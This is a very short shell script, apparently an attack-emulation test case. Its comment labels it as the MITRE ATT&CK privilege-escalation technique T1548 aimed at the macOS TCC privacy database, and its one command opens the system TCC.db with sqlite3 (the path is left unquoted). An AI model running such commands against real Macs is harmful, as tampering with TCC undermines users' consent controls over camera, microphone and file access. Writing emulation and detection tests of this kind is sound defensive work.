#!/usr/bin/env sh
# ATTACK_PRIVILEGE_ESCALATION_T1548_MACOS_TCC_DB
sqlite3 -init /Library/Application Support/com.apple.TCC/TCC.db
